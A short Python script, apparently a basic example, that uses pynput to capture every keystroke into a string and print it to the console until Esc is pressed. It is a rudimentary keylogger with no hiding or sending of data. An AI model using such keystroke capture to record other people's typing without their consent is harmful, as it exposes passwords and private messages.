from pynput import keyboard


# OBS: allow IDE Input Monitoring, Accessibility, Full Disk Access in OS settings

text = ""

def on_press(key):
    global text

    try:
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.shift:
            pass
        elif key == keyboard.Key.backspace and len(text) == 0:
            pass
        elif key == keyboard.Key.backspace and len(text) > 0:
            text = text[:-1]
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            pass
        elif key == keyboard.Key.esc:
            return False
        else:
            # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
            text += str(key).strip("'")
        print(text)

    except AttributeError:
        print('special key {0} pressed'.format(key))

with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()
